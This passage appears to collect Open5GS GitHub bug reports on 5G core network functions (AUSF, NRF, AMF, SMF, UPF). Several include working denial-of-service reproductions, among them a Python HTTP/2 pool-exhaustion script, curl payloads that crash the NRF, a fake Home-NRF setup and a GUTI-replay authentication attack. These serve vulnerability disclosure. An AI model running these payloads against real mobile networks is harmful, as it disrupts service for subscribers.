```c
/* src/upf/n4-handler.c — upf_n4_handle_session_deletion_request() */
if (!sess) {
    ogs_error("No Context");
    ogs_pfcp_send_error_message(xact, 0,
            OGS_PFCP_SESSION_DELETION_RESPONSE_TYPE,
            OGS_PFCP_CAUSE_SESSION_CONTEXT_NOT_FOUND, 0);
    return;
}
upf_pfcp_send_session_deletion_response(xact, sess);   /* cause 1 to ANY peer */
```

Nothing downstream compares `xact`'s source address with the session's owning
node, and nothing notifies the SMF when the context is removed
(`src/upf/context.c:256` frees the session, clears the UE-IP/SEID hashes and
returns without any CP notification).

The enumeration is easy: the UP-SEID pool is bounded, misses are answered
with a cause (which also confirms candidate SEIDs), and the UPF log prints
every live session's UP-SEID.

items.title: [Bug]: AUSF crashes with SIGABRT at nghttp2-server.c:1599 — memory pool exhaustion from allocate-before-validate pattern

labels.name: status:already-fixed
labels.description: This issue has already been fixed in the codebase or addressed in a previous issue.

items.body:
### Open5GS Release, Revision, or Tag

v2.7.6 (Docker image `open5gs-fuzz:latest`)

### Steps to reproduce

The AUSF crashes with SIGABRT when its internal memory pool (`ogs_pool_id_calloc`) is exhausted by repeated requests that allocate context before failing routing/version validation, causing context leaks.

**Environment:**
- Docker deployment, bridge network 172.23.0.0/16
- AUSF at 172.23.0.50:7777, NRF and other NFs present
- AUSF compiled from Open5GS v2.7.x using nghttp2 for HTTP/2

**Reproduction steps:**

1. Start Open5GS containers with AUSF running
2. Send requests that allocate context then fail routing:
   ```python
   import socket, ssl, h2.connection, h2.config, json
   
   AUSF_HOST = "172.23.0.50"
   AUSF_PORT = 7777
   
   sock = socket.create_connection((AUSF_HOST, AUSF_PORT), timeout=10)
   ctx = ssl.create_default_context()
   ctx.check_hostname = False
   ctx.verify_mode = ssl.CERT_NONE
   ssock = ctx.wrap_socket(sock, server_hostname=AUSF_HOST)
   
   config = h2.config.H2Configuration(client_side=True, header_encoding="utf-8")
   conn = h2.connection.H2Connection(config=config)
   conn.initiate_connection()
   ssock.sendall(conn.data_to_send())
   
   # Phase 1: Path traversal — change API version from v1 to v0
   # This triggers "Not supported version [v0]" but context is already allocated
   for i in range(500):
       headers = [
           (':method', 'POST'),
           (':path', '/nausf-auth/v0/ue-authentications'),  # v0 — invalid version
           (':authority', f'{AUSF_HOST}:{AUSF_PORT}'),
           (':scheme', 'http'),
           ('content-type', 'application/json'),
           ('content-length', '2'),
       ]
       sid = conn.get_next_available_stream_id()
       conn.send_headers(sid, headers)
       conn.send_data(sid, b'{}', end_stream=True)
       ssock.sendall(conn.data_to_send())
   
   # Phase 2: POST to unregistered endpoint
   # This triggers "Not found [POST]" but context was already allocated
   for i in range(500):
       headers = [
           (':method', 'POST'),
           (':path', '/nausf-auth/v1/unknown-endpoint'),
           (':authority', f'{AUSF_HOST}:{AUSF_PORT}'),
           (':scheme', 'http'),
           ('content-type', 'application/json'),
           ('content-length', '2'),
       ]
       sid = conn.get_next_available_stream_id()
       conn.send_headers(sid, headers)
       conn.send_data(sid, b'{}', end_stream=True)
       ssock.sendall(conn.data_to_send())
   # Phase 3: Pool is now exhausted. Send one more request.
   # The HTTP/2 layer tries to create a new stream → assert(stream) fails → SIGABRT
   headers = [
       (':method', 'GET'),
       (':path', '/nausf-auth/v1/ue-authentications'),
       (':authority', f'{AUSF_HOST}:{AUSF_PORT}'),
       (':scheme', 'http'),
   ]
   sid = conn.get_next_available_stream_id()
   conn.send_headers(sid, headers, end_stream=True)
   ssock.sendall(conn.data_to_send())
   ```
Root cause: In `ausf-sm.c`, the AUSF allocates a context from the pool BEFORE validating the API version or request route. When validation fails, the error path returns WITHOUT freeing the context. Repeating this exhausts the pool. When the HTTP/2 server layer (`nghttp2-server.c`) subsequently tries to create a new stream, `assert(stream)` fires because no pool entries are available.

### Logs

```shell
$ docker logs fuzzing-open5gs-ausf --tail 40

[ausf] ERROR: Not supported version [v0] (../src/ausf/ausf-sm.c:92)
[ausf] ERROR: Not found [POST] (../src/ausf/ausf-sm.c:159)
[ausf] ERROR: ogs_pool_id_calloc() failed (../src/ausf/context.c:138)
[ausf] ERROR: Not found [POST] (../src/ausf/ausf-sm.c:159)
[ausf] ERROR: ogs_pool_id_calloc() failed (../src/ausf/context.c:138)
[ausf] ERROR: Not supported version [v0] (../src/ausf/ausf-sm.c:92)
[ausf] ERROR: ogs_pool_id_calloc() failed (../src/ausf/context.c:138)
[ausf] ERROR: Not found [POST] (../src/ausf/ausf-sm.c:159)
... (pattern repeats ~30 times) ...
[sbi] ERROR: ogs_pool_id_calloc() failed (../lib/sbi/nghttp2-server.c:758)
[sbi] FATAL: on_begin_headers: Assertion 'stream' failed. (../lib/sbi/nghttp2-server.c:1599)
[core] FATAL: backtrace() returned 10 addresses (../lib/core/ogs-abort.c:37)

$ docker inspect fuzzing-open5gs-ausf --format '{{.State.ExitCode}}'
(SIGABRT — container status shows "Exited")
```

### Expected behaviour

1. API version and route validation should happen BEFORE context allocation from the memory pool.
2. When validation fails, any already-allocated context should be freed (no leaks on error paths).
3. The memory pool should have a hard upper limit — when exhausted, the AUSF should return HTTP 503 rather than crashing.
4. `assert(stream)` in `nghttp2-server.c:1599` should be replaced with defensive error handling: `if (!stream) return -1;`


### Observed Behaviour

1. Context allocation (`ogs_pool_id_calloc`) at `context.c:138` happens BEFORE version/routing checks at `ausf-sm.c:92,159`. Failed requests leak the allocated context.
2. The `ogs_pool_id_calloc()` failure is logged but the caller does not stop processing — it continues and eventually triggers the assertion in the HTTP/2 layer.
3. The final crash occurs in `nghttp2-server.c:1599` where `assert(stream)` fires because no pool entries remain to create a new HTTP/2 stream.
4. The crash is a SIGABRT from the failed assertion, producing a backtrace at `ogs-abort.c:37`.

### eNodeB/gNodeB

_No response_

### UE Models and versions

_No response_

items.title: [Bug]: GTP-U Error Indication on S5-U tears down the whole IMS PDN without notifying the MME (VoLTE UE stuck until re-attach)

labels.name: type:bug
labels.description: Open5GS bug

labels.name: Housekeeping:ToClose
labels.description: Issues reviewed and closed. Old requests, issues which are not bug, feature or documentation request

items.body:
### Open5GS Release, Revision, or Tag

v2.8.0

### Steps to reproduce

The EPC Error Indication branch does not distinguish dedicated vs. default
bearers and never notifies the MME. TS 23.007 only mentions local cleanup
(“may notify O&M”), but a silent local delete of the default bearer leaves
the MME/UE desynchronised, which is the stuck‑UE symptom above.

EPC (S/P-GW split, CUPS) with an IMS APN used for VoLTE:

```
MME  ── S11 ──  SGW-C ── S5-C ──  SMF/PGW-C
                  │                   │
               (SGW-U) ── S5-U ── (UPF / PGW-U, IMS APN)
                  │
                S1-U ── eNB(s)
```

1. A VoLTE-capable UE attaches and establishes the IMS PDN connection
   (default bearer + a dedicated QCI‑1 bearer while on a call).
2. Place a VoLTE call so the UE is `ECM-CONNECTED` with active bearers.
3. Trigger a rapid / ping‑pong X2 (or S1) handover between two eNBs during
   the call. The SGW‑U downlink path‑switch (new eNB S1‑U F‑TEID) races with
   in‑flight downlink IMS media, so the PGW‑U forwards a downlink G‑PDU to a
   SGW‑U S5‑U F‑TEID that is momentarily stale.
4. The SGW‑U replies with a **GTP‑U Error Indication** on S5‑U for that
   F‑TEID; the PGW‑U reports it to the SMF as a PFCP Session Report
   (Error Indication Report).

The Error Indication can also be injected directly against the PGW‑U's S5‑U
downlink F‑TEID to reproduce deterministically (single crafted GTP‑U
Error Indication packet), without needing to provoke the handover race.



### Logs

```shell
[smf] ERROR: [imsi:...] Error Indication from SGW-C (n4-handler.c)
[smf] ERROR: EPC Session Released by Error Indication (gsm.c)


After this, the SMF/UPF PFCP session for the IMS PDN is gone, but **no**
`Delete Bearer Request` is sent to the MME, so there is no NAS
`Deactivate EPS Bearer Context Request` / detach toward the UE.
```

### Expected behaviour

Per **3GPP TS 23.007** (handling of a GTP‑U Error Indication at the P‑GW):

- Error Indication for a **dedicated** bearer → delete **only that bearer**.
- Error Indication for the **default** bearer → delete **all bearers of the
  PDN connection**.

In either case the P‑GW/SMF should run the PGW‑initiated bearer deactivation
procedure (Delete Bearer Request → SGW → MME → NAS deactivation toward the
UE) so that SGW / MME / UE stay synchronised and the UE can re‑establish the
IMS PDN and continue placing / receiving VoLTE calls.



### Observed Behaviour

`smf_n4_handle_session_report_request()` (EPC branch, `src/smf/n4-handler.c`)
calls `smf_epc_pfcp_send_session_deletion_request(sess, OGS_INVALID_POOL_ID)`
for **any** Error Indication, regardless of which bearer the reported F‑TEID
belongs to. This has two problems:

1. **Over‑deletion.** The whole PFCP session is torn down via the GSM FSM
   (`EPC Session Released by Error Indication` →
   `smf_gsm_state_session_will_release` → `smf_sess_remove()`), even when the
   Error Indication is for a single **dedicated** (voice) bearer. TS 23.007
   requires only that dedicated bearer to be removed in that case.
2. **No MME/UE notification.** No `Delete Bearer Request` is sent to the MME.
   The MME and UE keep a ghost IMS PDN connection. Data on other APNs keeps
   working, but the UE is unaware the IMS PDN is gone and **cannot originate a
   new VoLTE call until it re‑attaches** (e.g. airplane‑mode toggle).

Net effect: a single transient, handover‑induced Error Indication
permanently breaks VoLTE for that UE until a manual re‑attach.



### eNodeB/gNodeB

_No response_

### UE Models and versions

_No response_

items.title: AMF fails to handle inconsistent RAN UE NGAP ID per TS 38.413 §10.6

labels.name: status:already-fixed
labels.description: This issue has already been fixed in the codebase or addressed in a previous issue.

items.body:
**Description**

The AMF incorrectly continues a UE-associated signalling connection after receiving an inconsistent RAN UE NGAP ID, violating 3GPP TS 38.413 clause 10.6.

**Steps to reproduce**

1. gNB sends `INITIAL UE MESSAGE` (REGISTRATION REQUEST) with `RAN UE NGAP ID = 255`.
2. AMF responds with `DOWNLINK NAS TRANSPORT` (IDENTITY REQUEST) using `RAN UE NGAP ID = 255` – the UE-associated logical NG‑connection is established.
3. gNB sends `UPLINK NAS TRANSPORT` (IDENTITY RESPONSE) but with `RAN UE NGAP ID = 1` (inconsistent).
4. AMF sends another `DOWNLINK NAS TRANSPORT` (AUTHENTICATION REQUEST) still using `RAN UE NGAP ID = 255`.

**Expected behaviour**

According to TS 38.413 §10.6, upon receiving a message (other than first/first‑returned/last) with an inconsistent remote AP ID, the AMF **shall**:
- initiate the `Error Indication` procedure with the received AP IDs and an appropriate cause value,
- locally release the UE‑associated logical connection.

No further signalling on that connection should take place.

**Actual behaviour**

The AMF ignores the inconsistency and continues the NAS procedure using the original `RAN UE NGAP ID`.

**Impact**

- Protocol robustness issue; potential state mismatch between gNB and AMF.
- Could lead to resource leaks or improper handling if the gNB’s ID change was intentional (e.g., following an internal reset).

items.title: [Bug]: NRF crash on inter-PLMN `GET /nnrf-disc/v1/nf-instances` when a delayed Home-NRF response arrives after the original client disconnects

labels.name: Type:Security
labels.description: Security issue

labels.name: Housekeeping:ToClose
labels.description: Issues reviewed and closed. Old requests, issues which are not bug, feature or documentation request

items.body:
### Open5GS Release, Revision, or Tag

v2.7.7

### Steps to reproduce

### Description

NRF aborts during inter-PLMN discovery forwarding if the original HTTP/2 client
disconnects before the Home-NRF response comes back.

The forwarding path stores a raw `ogs_sbi_stream_t *` inside `nrf_assoc`:

```c
typedef struct nrf_assoc_s {
    ...
    ogs_sbi_stream_t *stream;
} nrf_assoc_t;
```

```c
assoc->stream = stream;
```

When the delayed Home-NRF response arrives, `discover_handler()` reuses that raw
pointer without checking whether the original stream/session is still alive:

```c
stream = assoc->stream;
ogs_assert(stream);
...
ogs_expect(true == ogs_sbi_server_send_response(stream, response));
```

But if the original client timed out and disconnected first, nghttp2 closes the
stream and frees it:

```c
stream = nghttp2_session_get_stream_user_data(session, stream_id);
...
stream_remove(stream);
```

The later response send then walks into `server_send_rspmem_persistent()` with
an invalid socket and aborts:

```c
fd = sock->fd;
ogs_assert(fd != INVALID_SOCKET);
```

This is a distinct crash from the already documented inter-PLMN `SearchResult`
pool-exhaustion issues. Here the attacker only needs a delayed but otherwise
valid Home-NRF response plus a client disconnect.

### Root cause

- Entry route:
  `GET /nnrf-disc/v1/nf-instances`
- Preconditions:
  inter-PLMN forwarding path with `hnrf-uri`, and the original client must
  disconnect before the Home-NRF replies
- Raw association storage:
  `../src/nrf/context.h:44-48`
  and `../src/nrf/context.c:137-153`
- Response callback:
  `../src/nrf/nnrf-handler.c:1360-1405`
- Stream free on disconnect:
  `../lib/sbi/nghttp2-server.c:1306-1327`
- Exact crash site:
  `../lib/sbi/nghttp2-server.c:643`
- Root cause family:
  stale stream / use-after-free style response handling leading to assertion
  abort
- Controlling factor:
  delayed Home-NRF response timing relative to original client disconnect

### Steps to reproduce

1. Start a fake h2c Home-NRF on the Docker `open5gs` network:

```bash
printf 'control\n' > /home/ubuntu/open5gs_277/.audit_tmp/nrf_fake_hnrf.mode
docker run --rm -d \
  --name hnrfctl \
  --network open5gs \
  --network-alias hnrfctl \
  -e NRF_FAKE_PORT=80 \
  -v /home/ubuntu/open5gs_277/.audit_tmp:/srv \
  node:24-alpine \
  node /srv/nrf_fake_hnrf.js
```

2. Control case: restart the local NRF and issue the inter-PLMN request with an
   immediate Home-NRF response:

```bash
docker restart nrf
sleep 2

docker run --rm --network open5gs curlimages/curl:8.10.1 \
  --http2-prior-knowledge -sS -i -m 8 --get \
  http://nrf.open5gs.org/nnrf-disc/v1/nf-instances \
  --data-urlencode 'target-nf-type=UDR' \
  --data-urlencode 'requester-nf-type=UDM' \
  --data-urlencode 'target-plmn-list=[{"mcc":"999","mnc":"70"}]' \
  --data-urlencode 'requester-plmn-list=[{"mcc":"001","mnc":"01"}]' \
  --data-urlencode 'hnrf-uri=http://hnrfctl'
```

3. Malicious case: switch the fake Home-NRF to delayed mode, restart the local
   NRF to clear the cached foreign UDR, then send the same request with a 1
   second client timeout so the original stream is closed before the delayed
   response returns:

```bash
printf 'delayed-control\n' > /home/ubuntu/open5gs_277/.audit_tmp/nrf_fake_hnrf.mode
docker restart nrf
sleep 2

docker run --rm --network open5gs curlimages/curl:8.10.1 \
  --http2-prior-knowledge -sS -i -m 1 --get \
  http://nrf.open5gs.org/nnrf-disc/v1/nf-instances \
  --data-urlencode 'target-nf-type=UDR' \
  --data-urlencode 'requester-nf-type=UDM' \
  --data-urlencode 'target-plmn-list=[{"mcc":"999","mnc":"70"}]' \
  --data-urlencode 'requester-plmn-list=[{"mcc":"001","mnc":"01"}]' \
  --data-urlencode 'hnrf-uri=http://hnrfctl'

sleep 4
docker inspect -f '{{.State.Status}} {{.State.ExitCode}} {{.State.FinishedAt}}' nrf
docker logs --tail 120 nrf 2>&1
```

### Logs

```shell
04/23 12:49:11.233: [sbi] INFO: RST_STREAM received: stream_id=1 (../lib/sbi/nghttp2-server.c:1288)
04/23 12:49:11.233: [sbi] ERROR: on_stream_close_callback() failed (5:STREAM_CLOSED) (../lib/sbi/nghttp2-server.c:1320)
04/23 12:49:13.245: [sbi] FATAL: server_send_rspmem_persistent: Assertion `fd != INVALID_SOCKET' failed. (../lib/sbi/nghttp2-server.c:643)
04/23 12:49:13.250: [core] FATAL: backtrace() returned 12 addresses (../lib/core/ogs-abort.c:37)
```

### Expected behaviour

NRF should detect that the original client stream is already gone and drop the delayed Home-NRF response without aborting.

### Observed Behaviour

If the original inter-PLMN discovery client disconnects before the delayed Home-NRF reply arrives, NRF reuses a stale stream pointer and terminates with exit code `139`.

### eNodeB/gNodeB

Not required.

### UE Models and versions

Not required.

items.title: [Bug]: AMF sends Authentication Reject without GUTI->SUCI fallback, allowing targeted UE service disruption

labels.name: Housekeeping:ToClose
labels.description: Issues reviewed and closed. Old requests, issues which are not bug, feature or documentation request

labels.name: not-an-open5gs-bug
labels.description: This is not a bug in open5gs

items.body:
## Summary

open5gs sends an immediate `Authentication Reject` when authentication fails for a UE that registered using a 5G-GUTI. It does not first request the SUCI with an `Identity Request`.

This appears to violate the GUTI-to-SUCI fallback behavior required by the 5G authentication procedure. The most direct NAS-procedure reference is 3GPP TS 24.501, Section 5.4.1.3.7, which describes the network-side abnormal case for authentication failure. TS 33.501 also describes the same security rationale: if authentication fails while the UE was identified by 5G-GUTI, the AMF/SEAF should retrieve the SUCI before rejecting, because the GUTI may be stale, replayed, or used by a different UE.

In dynamic testing, this is not only a conformance issue. A second UE can reuse a legitimate UE's GUTI, intentionally fail authentication, and cause the legitimate UE's NG context to become unusable. The legitimate UE then fails to establish a PDU session, while the no-attack baseline succeeds.

This issue is related to open5gs/open5gs#4367, but it covers a different failure path. open5gs/open5gs#4367 reports that AMF releases an already-registered UE's PDU sessions before authenticating a new Registration Request that reuses the same 5G-GUTI. This report focuses on the subsequent authentication-failure handling: after the GUTI-reusing UE fails authentication, AMF sends `Authentication Reject` directly instead of performing the required GUTI-to-SUCI fallback, and the legitimate UE's service is disrupted.

## Environment

- open5gs v2.7.7
- UERANSIM_CoreTesting state-learner UE/gNB
- Test PLMN: `999/70`
- UE SUPI: `imsi-999700000000001`
- Relevant open5gs code: `src/amf/gmm-sm.c`, `gmm_state_authentication`

## Root cause

In `gmm_state_authentication`, open5gs directly sends `Authentication Reject` when `gmm_handle_authentication_response()` fails:

```c
case OGS_NAS_5GS_AUTHENTICATION_RESPONSE:
    rv = gmm_handle_authentication_response(
            amf_ue, &nas_message->gmm.authentication_response);

    if (rv != OGS_OK) {
        ogs_error("gmm_handle_authentication_response() failed");
        r = nas_5gs_send_authentication_reject(amf_ue);
        ogs_expect(r == OGS_OK);
        ogs_assert(r != OGS_ERROR);
        AMF_RESTORE_CONTEXT_ON_FAILURE(amf_ue, s);
        break;
    }
    break;
```

There is no check equivalent to: "if the identity used for registration was 5G-GUTI and SUCI has not yet been requested, suspend/retry the authentication procedure by sending Identity Request(SUCI) instead of sending Authentication Reject immediately."

For comparison, free5GC implements this fallback in `HandleAuthenticationResponse`. This is not the normative source, but it is a useful implementation reference for the expected behavior:

```go
if ue.IdentityTypeUsedForRegistration == nasMessage.MobileIdentity5GSType5gGuti &&
   ue.IdentityRequestSendTimes == 0 {
    ue.IdentityRequestSendTimes++
    gmm_message.SendIdentityRequest(ue.RanUe[accessType], accessType,
        nasMessage.MobileIdentity5GSTypeSuci)
    return nil
}
gmm_message.SendAuthenticationReject(...)
```

## Static evidence

```text
open5gs src/amf/gmm-sm.c:
  GUTI->SUCI fallback references: 0
  nas_5gs_send_authentication_reject calls: 5

free5gc NFs/amf/internal/gmm/handler.go:
  GUTI->SUCI fallback checks: 3
  SendIdentityRequest(SUCI): 4
```

## Standards expectation

The normative behavior should be described using the 3GPP specifications rather than another implementation.

- TS 24.501, Section 5.4.1.3.7, is the best primary citation for this issue because it specifies the NAS authentication procedure and the network-side abnormal case when authentication response verification fails.
- TS 33.501 is useful supporting material because it explains the security requirement behind the fallback: direct reject is appropriate when SUCI was already used, but when the initial NAS message used 5G-GUTI, AMF/SEAF should retrieve SUCI through the identification procedure before final rejection.
- free5GC should be cited only as an implementation comparison showing that another 5GC follows this GUTI-to-SUCI fallback logic.

## Expected behavior

When a UE registers using 5G-GUTI and authentication fails, the AMF should not immediately reject the UE based only on the GUTI-associated context.

Expected flow:

```text
UE -> AMF: Registration Request with 5G-GUTI
AMF -> UE: Authentication Request
UE -> AMF: Authentication Response with invalid RES*
AMF -> UE: Identity Request requesting SUCI
UE -> AMF: Identity Response with SUCI
AMF: retry/continue authentication against the SUCI-derived subscriber identity
AMF -> UE: Authentication Reject only if SUCI fallback also fails
```

This prevents a stale/replayed/borrowed GUTI from causing rejection or context disruption for the legitimate UE.

## Actual behavior

open5gs uses the GUTI to find the existing UE context, sends `Authentication Request`, and when the replaying UE returns an invalid RES*, it immediately sends `Authentication Reject`.

Actual observed flow:

```text
UE2 -> AMF: Registration Request with UE1's 5G-GUTI
AMF -> UE2: Authentication Request
UE2 -> AMF: Authentication Response with corrupted RES*
AMF -> UE2: Authentication Reject
```

No `Identity Request(SUCI)` is sent. The AMF logs:

```text
gmm_handle_authentication_response() failed
Authentication reject
```

In the service-impact test, the legitimate UE1's later `PDUSessionEstablishmentRequest` receives no response, and AMF logs show:

```text
Cannot find AMF-UE Context [1]
Implicit NG release
UE Context Release [Action:1]
```

## Dynamic reproduction

I used a modified UERANSIM state-learner UE with three test controls:

- `dumpGUTI`: return the UE's stored GUTI after registration
- `POC_FORCE_GUTI=1` plus `POC_GUTI_REGION`, `POC_GUTI_SET`, `POC_GUTI_POINTER`, `POC_GUTI_TMSI`: force a Registration Request to use a selected GUTI
- `POC_BAD_AUTH_RES=1`: flip one byte in the Authentication Response RES* before sending

Steps:

1. Start open5gs, gNB, and UE1.
2. UE1 completes full registration:
   `Registration Request(SUCI) -> Authentication Response -> Security Mode Complete -> Registration Complete`.
3. UE1's confirmed GUTI is read with `dumpGUTI`.
4. Start UE2 with `POC_FORCE_GUTI=1`, using UE1's GUTI.
5. UE2 sends `registrationRequestGUTI_nosec`.
6. open5gs returns `authenticationRequest`.
7. UE2 sends `authenticationResponse` with corrupted RES* (`POC_BAD_AUTH_RES=1`).
8. open5gs returns `authenticationReject` directly, with no Identity Request(SUCI).

Observed result:

```text
UE1 GUTI: region=2 set=1 pointer=0 tmsi=0xc00002f8
UE2 registrationRequestGUTI_nosec -> authenticationRequest
UE2 bad authenticationResponse -> authenticationReject
AMF Identity Request hits: []
```

AMF log:

```text
07/01 05:22:35.147: [gmm] INFO: [suci-0-999-70-0000-0-0-0000000001] 5G-S_GUTI[AMF_ID:0x20040,M_TMSI:0xc00002f8]
07/01 05:22:41.152: [gmm] ERROR: gmm_handle_authentication_response() failed (../src/amf/gmm-sm.c:2131)
07/01 05:22:41.152: [amf] WARNING: [suci-0-999-70-0000-0-0-0000000001] Authentication reject (../src/amf/nas-path.c:531)
```

## Impact: legitimate UE service disruption

I also tested whether this affects the legitimate UE1 after UE2 triggers the failure.

Attack run:

1. UE1 registers successfully and sends `Registration Complete`.
2. UE2 reuses UE1's GUTI and triggers authentication failure.
3. UE1 then sends `PDUSessionEstablishmentRequest`.

Result after attack:

```text
UE1 post-attack PDUSessionEstablishmentRequest -> no response
```

AMF log:

```text
07/01 05:28:08.371: [gmm] WARNING: [imsi-999700000000001] Failure in transaction; restoring context and transitioning to REGISTERED.
07/01 05:28:18.381: [amf] ERROR: Cannot find AMF-UE Context [1] (../src/amf/ngap-handler.c:727)
07/01 05:28:32.370: [amf] WARNING: Implicit NG release
07/01 05:28:32.370: [amf] INFO: UE Context Release [Action:1]
07/01 05:28:32.370: [amf] INFO: RAN_UE_NGAP_ID[1] AMF_UE_NGAP_ID[1]
```

No-attack baseline:

```text
UE1 registration -> PDUSessionEstablishmentRequest -> pduSessionEstablishmentAccept
PDU Session establishment is successful PSI[1]
```

This indicates that a UE that knows/replays a victim's valid GUTI can trigger authentication failure and disrupt the victim UE's subsequent service, at least by breaking/releasing the victim NG context and preventing PDU session establishment.

## Security impact

- Targeted denial of service against a known victim GUTI.
- Victim UE's NG context can be disrupted/released by another UE.
- The attack does not authenticate as the victim and does not bypass AKA.
- The main prerequisite is knowledge of a valid victim 5G-GUTI.

I would rate this as a medium-severity protocol handling issue: a temporary identifier replay should not be able to cause service disruption for the legitimate UE without first falling back to SUCI confirmation.

## Suggested fix

Before sending `Authentication Reject` on authentication response failure, check whether the UE was identified using 5G-GUTI and whether SUCI fallback has already been attempted. If not, send `Identity Request(SUCI)` and continue authentication with the returned SUCI.

Pseudo-code:

```c
if (amf_ue->identity_type_used_for_registration == GUTI &&
    amf_ue->identity_request_send_times == 0) {
    amf_ue->identity_request_send_times++;
    nas_5gs_send_identity_request(amf_ue, SUCI);
    return;
}

nas_5gs_send_authentication_reject(amf_ue);
AMF_RESTORE_CONTEXT_ON_FAILURE(amf_ue, s);
```

The same fallback should be considered for other authentication failure paths that currently send `Authentication Reject` directly.

items.title: [Bug] : NRF Crash on oversized dnnSMfInfoList in smfInfo registration

labels.name: Housekeeping:ToClose
labels.description: Issues reviewed and closed. Old requests, issues which are not bug, feature or documentation request

labels.name: not-an-open5gs-bug
labels.description: This is not a bug in open5gs

items.body:
### Open5GS Release, Revision, or Tag

v2.7.7

### Steps to reproduce


NRF crashes when processing an NF registration (`PUT /nnrf-nfm/v1/nf-instances/{nfInstanceId}`) containing an `smfInfo` with more than 16 DNN entries in a single SNSSAI slice.

The root cause is a reachable assertion (CWE-617) in the inner DNN iteration loop of `handle_smf_info()`:

```c
OpenAPI_list_for_each(DnnSmfInfoList, node2) {
    DnnSmfInfoItem = node2->data;
    if (DnnSmfInfoItem && DnnSmfInfoItem->dnn) {
        int dnn_index = nf_info->smf.slice
            [nf_info->smf.num_of_slice].num_of_dnn;

        ogs_assert(dnn_index < OGS_MAX_NUM_OF_DNN);   // <-- CRASH
        nf_info->smf.slice[nf_info->smf.num_of_slice].
            dnn[dnn_index] = ogs_strdup(DnnSmfInfoItem->dnn);
        ogs_assert(
            nf_info->smf.slice[nf_info->smf.num_of_slice].
                dnn[dnn_index]);
        nf_info->smf.slice[nf_info->smf.num_of_slice].
            num_of_dnn++;
    }
}
```

at `../lib/sbi/nnrf-handler.c:428-442`.

The destination array has capacity `OGS_MAX_NUM_OF_DNN == 16`:

```c
#define OGS_MAX_NUM_OF_DNN              16
```

at `../lib/proto/types.h:102`.

The **outer** slice loop was already bounded by the fix for #4249:

```c
if (nf_info->smf.num_of_slice >= OGS_MAX_NUM_OF_SLICE) {
    ogs_error("OVERFLOW Slice [%d:%d]", ...);
    break;
}
```

at `../lib/sbi/nnrf-handler.c:421-424`.

However the **inner** DNN loop was not addressed - the `ogs_assert` at `line 434` remained unchanged since commit `e6a14cb73d` (2022-08-12). Sending 17 or more DNN entries in a single SNSSAI triggers the assertion, which calls `ogs_abort()` → `abort()` → `SIGABRT`, terminating the NRF process.

Without the assertion, the code would write `ogs_strdup()` pointers past the end of the `dnn[16]` array into adjacent heap memory (CWE-787), corrupting the `ogs_sbi_nf_info_t` struct.

This is distinct from #4249 (outer slice loop, fixed), #4463 (NF-info pool exhaustion via `smfInfoList` map entries, different root cause), and #4467 (AMF `taiRangeList.tacRangeList`, different handler and array).

### Root cause

- Entry route: `PUT /nnrf-nfm/v1/nf-instances/{nfInstanceId}`
- Call chain: `nrf_nnrf_handle_nf_register()` → `ogs_nnrf_nfm_handle_nf_profile()` → `handle_smf_info()`
- Root-cause site: `../lib/sbi/nnrf-handler.c:434`
- Root cause family: CWE-617 (Reachable Assertion) / CWE-129 (Improper Validation of Array Index)
- Controlling field: `NFProfile.smfInfo.sNssaiSmfInfoList[*].dnnSmfInfoList`

### Steps to Reproduce

Prerequisite: Open5GS v2.7.7 with NRF running on default configuration (`127.0.0.10:7777`). Python 3 with `httpx` and `h2` packages (`pip3 install httpx[http2] h2`).

1. Confirm NRF is running:

```bash
curl --http2-prior-knowledge http://127.0.0.10:7777/nnrf-nfm/v1/nf-instances
```

2. Note the NRF PID:

```bash
echo "NRF PID: $(pgrep -f open5gs-nrfd)"
```

3. Send malicious NF registration with 20 DNN entries (limit is 16):

```bash
curl --http2-prior-knowledge -X PUT \
  http://127.0.0.10:7777/nnrf-nfm/v1/nf-instances/aaaaaaaa-bbbb-cccc-dddd-eeeeeeeeeeee \
  -H 'Content-Type: application/json' \
  --data-raw "$(python3 -c '
import json
dnn_list = [{"dnn": f"overflow-dnn-{i}"} for i in range(20)]
data = {
    "nfInstanceId": "aaaaaaaa-bbbb-cccc-dddd-eeeeeeeeeeee",
    "nfType": "SMF",
    "nfStatus": "REGISTERED",
    "smfInfo": {
        "sNssaiSmfInfoList": [{
            "sNssai": {"sst": 1},
            "dnnSmfInfoList": dnn_list
        }]
    }
}
print(json.dumps(data))
')"
```


4, Verify that PID has changed:
```bash
echo "NRF PID: $(pgrep -f open5gs-nrfd)"
```

5. Verify NRF crashed via service log:
```bash
journalctl -u open5gs-nrfd --since "1 minute ago" | grep -E "FATAL|ABRT|assert"
```

### Logs

```shell
04/22 08:57:22.490: [sbi] FATAL: handle_smf_info: Assertion `dnn_index < OGS_MAX_NUM_OF_DNN' failed. (../lib/sbi/nnrf-handler.c:434)
04/22 08:57:22.492: [core] FATAL: backtrace() returned 12 addresses (../lib/core/ogs-abort.c:37)
/usr/lib/aarch64-linux-gnu/libogssbi.so.2(+0x3f6d8) [0xef15385ff6d8]
/usr/lib/aarch64-linux-gnu/libogssbi.so.2(ogs_nnrf_nfm_handle_nf_profile+0x434) [0xef1538600274]
/usr/bin/open5gs-nrfd(+0x6560) [0xc655655f6560]
/usr/bin/open5gs-nrfd(+0x6b94) [0xc655655f6b94]
/usr/lib/aarch64-linux-gnu/libogscore.so.2(ogs_fsm_dispatch+0x2c) [0xef153855964c]
/usr/bin/open5gs-nrfd(+0x9014) [0xc655655f9014]
/usr/lib/aarch64-linux-gnu/libogscore.so.2(ogs_fsm_dispatch+0x2c) [0xef153855964c]
/usr/bin/open5gs-nrfd(+0x5d1c) [0xc655655f5d1c]
/usr/lib/aarch64-linux-gnu/libogscore.so.2(+0x978c) [0xef153854978c]
/usr/lib/aarch64-linux-gnu/libc.so.6(+0x8b9f4) [0xef1537dcb9f4]
/usr/lib/aarch64-linux-gnu/libc.so.6(+0xf700c) [0xef1537e3700c]
systemd[1]: open5gs-nrfd.service: Main process exited, code=dumped, status=6/ABRT
systemd[1]: open5gs-nrfd.service: Failed with result 'core-dump'.
```

### Expected behaviour

NRF should cap the number of DNN entries at `OGS_MAX_NUM_OF_DNN` and continue processing, consistent with the bounded pattern already used for the outer slice loop at `line 421`.

### Observed Behaviour

A single unauthenticated HTTP/2 request terminates the NRF process with `SIGABRT` (exit code 6, core dump). `systemd` restarts the NRF, but the request can be repeated for persistent DoS. All dependent NFs (AMF, SMF, UPF, etc.) lose NF discovery while the NRF is down.

### eNodeB/gNodeB

_No response_

### UE Models and versions

_No response_

### Suggested fix

Replace the assertion with a bounds check and break:

```diff
--- a/lib/sbi/nnrf-handler.c
+++ b/lib/sbi/nnrf-handler.c
@@ -431,12 +431,20 @@
